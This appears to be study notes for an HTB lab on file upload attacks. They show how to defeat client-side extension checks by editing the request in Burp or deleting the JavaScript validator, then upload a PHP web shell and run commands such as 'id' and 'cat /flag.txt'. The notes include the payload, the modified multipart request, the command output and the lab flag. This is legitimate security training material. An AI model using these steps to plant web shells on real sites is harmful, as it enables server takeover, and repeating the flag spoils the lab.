---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
source_file: "CWES.xmind"
---

# Client-Side Validation

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Many web applications only rely on front-end JavaScript code to validate the selected file format

## Profile Image

### limited to image

- validation appears to be happening on the front-end
  - we can either
    - Back-end Request Modification
      - capture the upload request with Burp
        - two important parts in the request are filename="HTB.png" and the file content at the end of the request.
          - modify the filename to shell.php and modify the content to the web shell
            - We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
            - File successfully uploaded
    - Disabling Front-end Validation
      - [CTRL+SHIFT+C]
        - Page Inspector
          - click on the profile image, which is where we trigger the file selector for the upload form
            - highlight the following HTML
              - <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
                - run a JavaScript code whenever we select a file, which appears to be doing the file type validation
      - [CTRL+SHIFT+K]
        - Console
          - then we can type the function's name (checkFile) to get its detail
            - Code: javascript
              - function checkFile(File) {  
                ...SNIP...  
                if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {  
                $('#error_message').text("Only images are allowed!");  
                File.form.reset();  
                $("#submit").attr("disabled", true);  
                ...SNIP...  
                }  
                }
                - add PHP as one of the allowed extensions
                  - Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation
      - Delete the function
        - inspector
          - click on the profile image again
            - double-click on the function name (checkFile) on line 18
              - delete it
                - You may also do the same to remove accept=".jpg,.jpeg,.png", which should make selecting the PHP shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.
                - refresh the page
                  - Inspector
                    - click on the profile image
                      - see the URL of our uploaded web shell
                        - <img src="/profile_images/shell.php" class="profile-image" id="profile-image">
      - web shell
        - http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
## LAB

### upload an image

- intercept in Burp
  - change the file name.ext and the content
    - Content-Disposition: form-data; name="uploadFile"; filename="shell.php"  
      Content-Type: image/png  

      <?<!-- -->php sys<!-- -->tem($_REQUEST['cmd']); ?>  
      ------geckoformboundarya03ae5863944a627a32c1c92bc9b3249--
      - Forward
        - Check the path for the image
          - use inspector and click on the profile image
            - visit the page /profile_images/php<!-- -->bash.php?cmd=id
              - uid=33(www-data) gid=33(www-data) groups=33(www-data)
                - /profile_images/php<!-- -->bash.php?cmd=cat+/flag.txt
                  - HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
